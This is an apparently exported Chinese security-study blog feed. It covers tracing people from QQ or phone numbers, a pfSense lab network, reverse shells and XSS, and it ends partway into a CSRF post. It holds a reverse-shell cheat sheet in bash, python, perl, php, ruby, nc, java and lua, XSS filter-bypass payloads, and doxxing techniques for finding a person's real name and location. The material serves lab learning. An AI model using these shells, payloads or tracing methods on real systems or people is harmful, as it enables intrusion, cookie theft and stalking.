<h4 id="知道qq号能怎么利用"><a href="#知道qq号能怎么利用" class="headerlink" title="知道qq号能怎么利用"></a>知道qq号能怎么利用</h4><ol>
<li>查看个人信息、空间信息、说说日志留言，了解这个人大体的生活状态和地理位置</li>
<li>加qq钓鱼、共同好友、可能认识的人</li>
<li>通过qq邮箱和qq号搜索支付宝、淘宝等平台</li>
<li>通过微信搜索</li>
<li>搜索腾讯\新浪微博</li>
</ol>
<h4 id="知道手机号"><a href="#知道手机号" class="headerlink" title="知道手机号"></a>知道手机号</h4><ol>
<li>搜索主流社交账号：qq、微信、微博、小红书等</li>
<li>查询支付宝、qq交易，通过进行转账查看真实的姓氏</li>
<li>根据qq空间或朋友圈照片进行百度识图</li>
</ol>
<h4 id="留意社交动态"><a href="#留意社交动态" class="headerlink" title="留意社交动态"></a>留意社交动态</h4><p>照片中暴露的信息，水印、地理位置等信息</p>
<p>照片的exif可能会有GPS和手机类型，图片内容特征</p>
]]></content>
  </entry>
  <entry>
    <title>内网环境搭建</title>
    <url>/2021/07/15/%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<h1 id="基本内网环境搭建"><a href="#基本内网环境搭建" class="headerlink" title="基本内网环境搭建"></a>基本内网环境搭建</h1><h3 id="网络拓扑"><a href="#网络拓扑" class="headerlink" title="网络拓扑"></a>网络拓扑</h3><p>用的思科模拟器画的，连接的方法肯定有问题，也没有连通，只能大概了解（学会了一定改）</p>
<p><img src="https://i.loli.net/2021/07/16/b4RUcqX2y8prB9l.png" alt="image-20210716122325331"></p>
<p>pfSense(充当路由、防火墙)</p>
<blockquote>
<p> 基于FreeBSD，专为防火墙和路由器功能定制的开源版本</p>
</blockquote>
<p>直接选择<code>典型</code>添加<code>iso</code>镜像文件，进行创建</p>
<p><img src="https://i.loli.net/2021/07/15/83iYPIeaX7dk9EZ.png" alt="image-20210715212155511"></p>
<p>按顺序配置五个网卡</p>
<p><img src="https://i.loli.net/2021/07/15/cIiqQey6FXjflD5.png" alt="image-20210715204928890"></p>
<p><del>编辑里添加一下<code>iso</code>镜像文件</del></p>
<p><del>等待网卡配置</del></p>
<p>不用自定义安装直接</p>
<p><img src="/2021/07/15/%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/Users\王\AppData\Roaming\Typora\typora-user-images\image-20210715211852671.png" alt="image-20210715211852671"></p>
<p>这里为什么要设置为<code>192.168.229.253</code>？是因为<code>VMnet8</code>网卡的地址是<code>192.168.229.1</code>（网卡地址如果没有的话可以自己设置一个静态ip）</p>
<p><img src="https://i.loli.net/2021/07/15/WcrRpSlfYFvO8zd.png" alt="image-20210715231253905"></p>
<p>访问</p>
<p><img src="/2021/07/15/%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/Users\王\AppData\Roaming\Typora\typora-user-images\image-20210715230832578.png" alt="image-20210715230832578"></p>
<p><img src="/2021/07/15/%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/Users\王\AppData\Roaming\Typora\typora-user-images\image-20210715230843355.png" alt="image-20210715230843355"></p>
<p><img src="https://i.loli.net/2021/07/15/Jr4YvDmiu1oMxaE.png" alt="image-20210715231538625"></p>
<p>系统，常规设置中修改语言为中文</p>
<p>网络接口，接口管理中添加三个接口，就是和虚拟机中设置的三个网卡相对应</p>
<p><img src="https://i.loli.net/2021/07/16/KEPRadL135WwmgM.png" alt="image-20210716100449009"></p>
<p>点击进入<code>OPT1</code>，启用接口，进行描述，选择IPv4类型为静态，并将IPv4地址设置为<code>172.16.1.254</code>，子网掩码为24位，保存配置–&gt;应用更改</p>
<p><img src="https://i.loli.net/2021/07/16/K6A4bvPsLa8gjmX.png" alt="image-20210716100821857"></p>
<p><code>OPT2</code>设置</p>
<p><img src="https://i.loli.net/2021/07/16/oyip2gbzdH3fx7W.png" alt="image-20210716122518464"></p>
<p>子网掩码的位数可以设置为8</p>
<p><img src="https://i.loli.net/2021/07/16/OsZTFUKDYRBGy3H.png" alt="image-20210716123516667"></p>
<p>分别添加<code>DMZ``OA``SERVER</code>规则策略</p>
<p>防火墙–&gt;规则策略–&gt;添加–&gt;协议设置为<code>any</code></p>
<p><img src="https://i.loli.net/2021/07/16/7gRYhTNWtjVU2Dz.png" alt="image-20210716123634964"></p>
<h3 id="win-server-2012配置"><a href="#win-server-2012配置" class="headerlink" title="win server 2012配置"></a>win server 2012配置</h3><p>关闭防火墙</p>
<p><img src="https://i.loli.net/2021/07/16/IJLlESr5npFYkxt.png" alt="image-20210716152633707"></p>
<p>看图启动即可</p>
<p><img src="https://i.loli.net/2021/07/16/ngqcdIQBjoRiuK2.png" alt="image-20210716153224867"></p>
<p>配置ip地址</p>
<p><img src="https://i.loli.net/2021/07/16/GOUnqcRQ8Wwavg3.png" alt="image-20210716170524052"></p>
<p><img src="https://i.loli.net/2021/07/16/SpV1FGZL5cYyO3j.png" alt="image-20210716170621213"></p>
<h3 id="win7配置"><a href="#win7配置" class="headerlink" title="win7配置"></a>win7配置</h3><p>设置一下ip地址和dns服务器，关闭防火墙</p>
<p><img src="https://i.loli.net/2021/07/16/FTPyeKYgbX8fkHi.png" alt="image-20210716171409092"></p>
<h3 id="win-server-2008配置"><a href="#win-server-2008配置" class="headerlink" title="win server 2008配置"></a>win server 2008配置</h3><p><img src="https://i.loli.net/2021/07/16/7VFYrJ3KBj4i2nZ.png" alt="image-20210716173951902"></p>
<p>ping一下三个服务器测试一下连通性</p>
<p><img src="https://i.loli.net/2021/07/16/HpR6wQzer4dnqXA.png" alt="image-20210716172349367"></p>
<p>改了一下路由器接口的ip，都通了</p>
<h3 id="设置DHCP为OA分配ip"><a href="#设置DHCP为OA分配ip" class="headerlink" title="设置DHCP为OA分配ip"></a>设置DHCP为OA分配ip</h3><p>系统服务–&gt;DHCP服务–&gt;OA</p>
<p>还要设置网关为<code>192.168.1.254</code></p>
<p><img src="https://i.loli.net/2021/07/16/ZckVML1FrsUTNfv.png" alt="image-20210716174450675"></p>
<p> <del>后面我把win7调回自动分配ip但还是识别的<code>192.168.229</code>网段</del></p>
<p>重启加重新配置了几次，自动识别可以了</p>
<p><img src="https://i.loli.net/2021/07/16/eZqy4wPBUVS67vH.png" alt="image-20210716181223254"></p>
<h3 id="更改防火墙规则只允许OA区上网"><a href="#更改防火墙规则只允许OA区上网" class="headerlink" title="更改防火墙规则只允许OA区上网"></a>更改防火墙规则只允许OA区上网</h3><p>防火墙–&gt;地址转换–&gt;出站</p>
<p>改为<code>手动</code>，删除其他映射，只设置一个原地址为<code>192.168.1.0</code>的映射</p>
<p><img src="https://i.loli.net/2021/07/16/pf1mlC3yDnXQGSY.png" alt="image-20210716175822922"></p>
<p><img src="https://i.loli.net/2021/07/16/jYhwganJcfWIbrN.png" alt="image-20210716164808262"></p>
]]></content>
      <categories>
        <category>内网</category>
      </categories>
      <tags>
        <tag>内网</tag>
      </tags>
  </entry>
  <entry>
    <title>反弹shell学习</title>
    <url>/2021/06/24/%E5%8F%8D%E5%BC%B9shell%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><h2 id="linux下反弹shell的几种方法"><a href="#linux下反弹shell的几种方法" class="headerlink" title="linux下反弹shell的几种方法"></a>linux下反弹shell的几种方法</h2><p>测试环境说明</p>
<p>攻击者：kali2020.03 64位 192.168.229.129</p>
<p>靶机：kali2018 192.168.229.130</p>
<p><a href="https://www.freebuf.com/articles/system/178150.html">https://www.freebuf.com/articles/system/178150.html</a></p>
<h3 id="bash-反弹"><a href="#bash-反弹" class="headerlink" title="bash 反弹"></a>bash 反弹</h3><p>反弹shell的命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<p>开启监听端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp port</span><br></pre></td></tr></table></figure>
<p>受害机上使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1</span><br><span class="line">解释：</span><br><span class="line">bash -i代表在本地打开一个bash</span><br><span class="line">然后就是&#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port， &#x2F;dev&#x2F;tcp&#x2F;是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接</span><br><span class="line">&gt;&amp;后面跟上&#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port这个文件代表将标准输出和标准错误输出重定向到这个文件，也就是传递到远程上，如果远程开启了对应的端口去监听，就会接收到这个bash的标准输出和标准错误输出</span><br><span class="line">加上0&gt;&amp;1，代表将标准输入重定向到标准输出，这里的标准输出已经重定向到了&#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port这个文件，也就是远程，那么标准输入也就重定向到了远程，这样的话就可以直接在远程输入了</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623305370591-81a7de94-5ef7-4df9-afb8-ca230297e390.png" alt="img"></p>
<h3 id="python-反弹"><a href="#python-反弹" class="headerlink" title="python 反弹"></a>python 反弹</h3><p>反弹shell的命令变为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &quot;import os,socket,subprocess;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;ip&#39;,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-i&#39;]);&quot;</span><br></pre></td></tr></table></figure>


<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623305501499-5f0540e6-7b0f-40f4-940a-4082513732f0.png" alt="img"></p>
<h3 id="nc-反弹"><a href="#nc-反弹" class="headerlink" title="nc 反弹"></a>nc 反弹</h3><p>条件是靶机上有nc</p>
<p>尝试两种方法后都莫有成功</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp port</span><br><span class="line"></span><br><span class="line">nc -e &#x2F;bin&#x2F;sh ip port </span><br><span class="line">-e后面跟的参数代表的是在创建连接后执行的程序，这里代表在连接到远程后可以在远程执行一个本地shell(&#x2F;bin&#x2F;bash)，也就是反弹一个shell给远程</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623307363295-39c15dae-1953-4fa5-9734-4a9cd7b14533.png" alt="img"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623307406531-927cfb8d-dfef-47f4-ae92-b22f6432bed7.png" alt="img"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -nvlp port</span><br><span class="line">nc -nvlp port</span><br><span class="line">nc ip port|&#x2F;bin&#x2F;bash|ip port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">使用nc监听端口反弹shell时可能会有一个警告：</span><br><span class="line">Warning: forward host lookup failed for bogon: Unknown host,</span><br><span class="line">根据nc帮助文档的提示加上-n参数就可以不产生这个警告了</span><br><span class="line">-n参数代表在建立连接之前不对主机进行dns解析</span><br></pre></td></tr></table></figure>


<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623307323674-b71ca629-7869-4534-ab4e-3feb9986cfd7.png" alt="img"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623307242554-99df599d-d6cf-4913-8fde-69cd68b76c2d.png" alt="img"></p>
<h3 id="php-反弹"><a href="#php-反弹" class="headerlink" title="php 反弹"></a>php 反弹</h3><p>注意php反弹shell的这些方法都需要php关闭safe_mode这个选项，才可以使用exec函数  </p>
<p>默认的php.ini文件中没有打开安全模式</p>
<p>使用php的exec函数执行反弹shell的命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php -&#39;exec(&quot;&#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port&quot;)&#39;</span><br></pre></td></tr></table></figure>
<p>但是没有成功</p>
<p> 之前乌云知识库上的一个姿势，使用php的fsockopen去连接远程：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php -r &#39;$sock&#x3D;fsockopen(&quot;ip&quot;,port);exec(&quot;&#x2F;bin&#x2F;bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span><br></pre></td></tr></table></figure>


<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623311000363-c37aba29-3a5d-4a03-b086-93ac4b0df42b.png" alt="img"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623310925650-41688ec7-49d7-4aea-9b28-012b0c4afcb2.png" alt="img"></p>
<h3 id="附上国外大佬整理的各种版本的shell写法"><a href="#附上国外大佬整理的各种版本的shell写法" class="headerlink" title="附上国外大佬整理的各种版本的shell写法"></a>附上国外大佬整理的各种版本的shell写法</h3><p><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#bash版本：</span><br><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.0.0.1&#x2F;8080 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">#perl版本:</span><br><span class="line">perl -e &#39;use Socket;$i&#x3D;&quot;10.0.0.1&quot;;$p&#x3D;1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;sh -i&quot;);&#125;;&#39;</span><br><span class="line"></span><br><span class="line">#python版本：</span><br><span class="line">python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39;</span><br><span class="line"></span><br><span class="line">#php版本：</span><br><span class="line">php -r &#39;$sock&#x3D;fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span><br><span class="line"></span><br><span class="line">#ruby版本：</span><br><span class="line">ruby -rsocket -e&#39;f&#x3D;TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;</span><br><span class="line"></span><br><span class="line">#nc版本：</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;nc版本正确，存在-e选项就能直接反弹shell</span><br><span class="line">nc -e &#x2F;bin&#x2F;sh 10.0.0.1 1234 </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;不存在-e选项</span><br><span class="line">rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;&#x2F;tmp&#x2F;f</span><br><span class="line"></span><br><span class="line">nc x.x.x.x 8888|&#x2F;bin&#x2F;sh|nc x.x.x.x 9999</span><br><span class="line"></span><br><span class="line">#java版本</span><br><span class="line">r &#x3D; Runtime.getRuntime()</span><br><span class="line">p &#x3D; r.exec([&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;10.0.0.1&#x2F;2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])</span><br><span class="line">p.waitFor()</span><br><span class="line"></span><br><span class="line">#lua</span><br><span class="line">lua -e &quot;require(&#39;socket&#39;);require(&#39;os&#39;);t&#x3D;socket.tcp();t:connect(&#39;10.0.0.1&#39;,&#39;1234&#39;);os.execute(&#39;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#39;);&quot;</span><br></pre></td></tr></table></figure>


<h2 id="powershell反弹shell的方法"><a href="#powershell反弹shell的方法" class="headerlink" title="powershell反弹shell的方法"></a>powershell反弹shell的方法</h2><p>测试环境说明</p>
<p>攻击者：kali2020.03 64位 192.168.229.129</p>
<p>靶机：win7 x64 192.168.229.134</p>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623318265542-562f9432-6581-422d-89ef-d854d7a3feb0.png" alt="img"></p>
<p>emmm暂时先鸽了</p>
<h2 id="其他反弹shell的方式"><a href="#其他反弹shell的方式" class="headerlink" title="其他反弹shell的方式"></a>其他反弹shell的方式</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MzkxNDEwMDA4Mw==&mid=2247483867&idx=1&sn=ac1c105241c071190fae3d18938e9189&chksm=c172dbc7f60552d1e0e0dd5a23d71e00e6472ba344088c6811a7c426a2cf08cfc2af0ba06a80&scene=178&cur_album_id=1555994601520431105#rd">利用ICMP(icmpsh)协议反弹Shell</a></p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.freebuf.com/articles/system/178150.html">linux下几种反弹shell方法的总结与理解</a></p>
<p><a href="https://www.anquanke.com/post/id/99793">powershell反弹shell常见方式</a></p>
]]></content>
  </entry>
  <entry>
    <title>常见web漏洞学习之xss学习</title>
    <url>/2021/07/11/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E%E4%B9%8Bxss%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="常见web漏洞学习之xss学习"><a href="#常见web漏洞学习之xss学习" class="headerlink" title="常见web漏洞学习之xss学习"></a>常见web漏洞学习之xss学习</h1><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><blockquote>
<p>跨站脚本攻击，就是将恶意代码嵌入到前端js代码中（反射型，DOM型）或是数据库中（存储型）当用户点击或访问就会触发xss代码执行，盗取用户cookies或session</p>
</blockquote>
<p>要注意的是可能存在浏览器的影响，会阻止js代码执行</p>
<h3 id="测试流程"><a href="#测试流程" class="headerlink" title="测试流程"></a>测试流程</h3><ol>
<li>找到注入点</li>
<li>输入一组“特殊字符+唯一标识字符”，查看返回结果</li>
<li>源码找到唯一标识字符，判断是否可以构造闭合</li>
<li>结合绕过方式，执行</li>
</ol>
<h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>反射型，存储型，DOM型</p>
<p>简单来说，反射型就是构造的恶意代码由于过滤不严格，使得嵌入到前端js页面中进行执行</p>
<p>玩玩<code>pikachu</code>靶场</p>
<h4 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h4><p>输入长度被限制了，先将文本框的最大限制<code>20</code>改大些</p>
<p><img src="/2021/07/11/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E%E4%B9%8Bxss%E5%AD%A6%E4%B9%A0/Users\王\AppData\Roaming\Typora\typora-user-images\image-20210713160014148.png" alt="image-20210713160014148"></p>
<p>以get方式提交的，可以直接在url中看到提交的xss</p>
<p><img src="https://i.loli.net/2021/07/13/gGnOdl3j4VwhCYT.png" alt="image-20210713160325433"></p>
<p><code>who is ,i don&#39;t care!</code></p>
<p><img src="https://i.loli.net/2021/07/13/LzoJMXOQ5m1EDsH.png" alt="image-20210713162302066"></p>
<p>看一下源码</p>
<p><img src="https://i.loli.net/2021/07/13/yrfeQIFUT2hazOJ.png" alt="image-20210713162627176"></p>
<h4 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h4><p>payload</p>
<p><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p>
<p><img src="/2021/07/11/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E%E4%B9%8Bxss%E5%AD%A6%E4%B9%A0/Users\王\AppData\Roaming\Typora\typora-user-images\image-20210714152233253.png" alt="image-20210714152233253"></p>
<p><img src="/2021/07/11/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E%E4%B9%8Bxss%E5%AD%A6%E4%B9%A0/Users\王\AppData\Roaming\Typora\typora-user-images\image-20210714152544701.png" alt="image-20210714152544701"></p>
<p>其他用户访问也会触发</p>
<p>kali</p>
<p><img src="https://i.loli.net/2021/07/14/Kn5ljP8gRMEQXGd.png" alt="image-20210714153107662"></p>
<h5 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h5><p>反射型数据交互只和前端js代码，没有进行存储，而存储型则是被写入到了后端，其他用户访问也会中招</p>
<h4 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h4><p>那什么是dom呢？简单来说dom就是通过层次分明的结果组织，来展示HTML标签抽象成代码里的对象，可以管理文档，增删改查规则，是一个HTML标准接口</p>
<blockquote>
<p>在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的Document object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用</p>
</blockquote>
<p><img src="https://i.loli.net/2021/07/14/6UWiEYVygrubAkd.png" alt="image-20210714105849246"></p>
<p>而dom型xss用一个例子来讲就是，页面中的”下一页按钮”点击之后并没有url的改变也就是参数没变，而是通过HTML代码中的dom来执行的</p>
<p>输入特殊字符<code>&#39;&lt;&quot;&gt;666</code>被过滤为<code>666</code></p>
<p><img src="https://i.loli.net/2021/07/14/vJkDzx3IaYmSFUK.png" alt="image-20210714120425068"></p>
<p>查看源码</p>
<p><img src="https://i.loli.net/2021/07/14/oj1wcUOyntbJMSN.png" alt="image-20210714120824574"></p>
<p>结合源码构造payload效果为点击弹窗</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;a href&#x3D;&#39;#&#39; onclick&#x3D;&quot;alert(&#39;xss&#39;)&quot;&gt;&#39;&gt;就让往事都随风,都随风吧&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>
<p>payload</p>
<p><code>#&#39; onclick=&quot;alert(&#39;xss&#39;)&quot;&gt;</code></p>
<p>点击<code>&#39;&gt;就让往事都随风,都随风吧</code></p>
<p><img src="https://i.loli.net/2021/07/14/J84TmvBj1bE2lQR.png" alt="image-20210714151950066"></p>
<h3 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h3><h4 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h4><p>贴一段师傅源码</p>
<p>区分大小写过滤<code>&lt;script&gt;</code>标签</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">//前端 1.html：</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>反射型XSS<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;action4.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">//后端 action4.php：</span><br><span class="line">&lt;?php</span><br><span class="line">$name=$_POST[&quot;name&quot;]; </span><br><span class="line">if($name!=null)&#123;</span><br><span class="line">	$name=preg_replace(&quot;/<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml">/&quot;,&quot;&quot;,$name);      //过滤<span class="tag">&lt;<span class="name">script</span>&gt;</span></span></span></span><br><span class="line"><span class="javascript">	$name=preg_replace(<span class="string">&quot;/&lt;\/script&gt;/&quot;</span>,<span class="string">&quot;&quot;</span>,$name);   <span class="comment">//过滤</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">	echo $name; </span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="嵌套-lt-script-gt-标签绕过"><a href="#嵌套-lt-script-gt-标签绕过" class="headerlink" title="嵌套&lt;script&gt;标签绕过"></a>嵌套<code>&lt;script&gt;</code>标签绕过</h4><p>其他源码同上，加了一个<code>i</code>，不区分大小写过滤<code>&lt;script&gt;</code>标签</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">$name=preg_replace(&quot;/<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml">/i&quot;,&quot;&quot;,$name);    //不区分大小写过滤 <span class="tag">&lt;<span class="name">script</span>&gt;</span></span></span></span><br><span class="line"><span class="javascript">$name=preg_replace(<span class="string">&quot;/&lt;\/script&gt;/i&quot;</span>,<span class="string">&quot;&quot;</span>,$name);  <span class="comment">//不区分大小写过滤 </span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>payload<code>&lt;scr&lt;script&gt;ipt&gt;alert(&#39;hack&#39;)&lt;/scr&lt;/script&gt;ipt&gt;</code></p>
<h4 id="过滤所有内容"><a href="#过滤所有内容" class="headerlink" title="过滤所有内容"></a>过滤所有内容</h4><p>其他源码同上</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">$name = preg_replace( &#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;, &#x27;&#x27;, $_GET[ &#x27;name&#x27; ] ); //过滤了&lt;script及其之间的所有内容</span><br></pre></td></tr></table></figure>
<p>虽然script标签不能使用了，但img、body等标签的事件或者 iframe 等标签的 src 注入恶意的 js 代码</p>
<p>payload<code>&lt;img src=1 οnerrοr=alert(&#39;hack&#39;)&gt;</code></p>
<p>其他继续补充</p>
<h3 id="利用手段"><a href="#利用手段" class="headerlink" title="利用手段"></a>利用手段</h3><p>盗取cookie</p>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="http://c.biancheng.net/view/3274.html">HTML DOM是什么</a></p>
<p><a href="https://blog.csdn.net/witwitwiter/article/details/115797971">Pikachu靶场：DOM型XSS以及DOM型XSS-X</a></p>
<p><a href="https://www.cnblogs.com/fairyting/p/12630548.html">DOM型XSS（pikachu）</a></p>
<p><a href="https://blog.csdn.net/qq_35393693/article/details/86597707">XSS(跨站脚本)漏洞详解之XSS跨站脚本攻击漏洞的解决</a></p>
]]></content>
      <categories>
        <category>xss</category>
      </categories>
      <tags>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title>常见web漏洞学习之CSRF</title>
    <url>/2021/07/14/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BCSRF/</url>
    <content><![CDATA[<h1 id="csrf学习"><a href="#csrf学习" class="headerlink" title="csrf学习"></a>csrf学习</h1><p>跨站请求伪造</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或访问包含攻击代码的页面（钓鱼），在受害者不知情的情况下以受害者的身份向发送请求，从而完成非法操作。</p>
<p>CSRF能够做的事情包括：以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账……造成的问题包括：个人隐私泄露以及财产安全</p>
<blockquote>
<p>与XSS最大区别就是csrf并没有盗取cookie而是直接利用</p>
</blockquote>
<p>图里解释很清楚了，就不赘述了</p>
<p><img src="https://pic002.cnblogs.com/img/hyddd/200904/2009040916453171.jpg" alt="img"></p>
<p>还是老生常谈的银行转账的问题</p>
<p>已知受害者在银行以GET请求来完成银行转账的操作，<code>http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000</code></p>
<p>而攻击者构造的代码是</p>
